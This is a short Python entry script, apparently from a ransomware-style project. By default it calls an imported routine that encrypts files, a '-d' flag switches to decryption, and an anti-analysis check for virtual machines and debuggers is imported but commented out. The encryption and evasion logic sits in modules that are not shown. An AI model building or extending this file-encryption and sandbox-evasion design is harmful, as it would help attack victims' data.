import sys
import antianalysis
import encrypt
import decrypt

def main():
    
    if len(sys.argv) > 1 and sys.argv[1] == "-d":
        decrypt.descifrar_archivos()
    else:
        #antianalysis.check_virtualization_and_debbuging() #(estorba al ejecutar me para el código...)
        encrypt.cifrar_archivos()

if __name__ == "__main__":
    main()